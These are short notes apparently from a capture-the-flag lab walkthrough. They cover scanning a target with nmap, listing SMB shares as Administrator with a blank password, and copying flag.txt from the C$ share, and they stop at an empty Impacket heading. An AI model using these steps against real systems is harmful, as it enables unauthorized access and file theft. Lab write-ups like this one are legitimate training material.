[[ping]] the host
sudo nmap -sC  -Pn --min-rate=1000 \[host]
smbclient -L \[target host IP] -U administrator
*blank password*

Two options of Attack:
Option A: SMB Unprotected C$ Share
smbclient \\\\\\\10.129.26.26\\\C$ -U Administrator
cd C:\Users\Administrator\Desktop
get flag.txt

Option B: Impacket

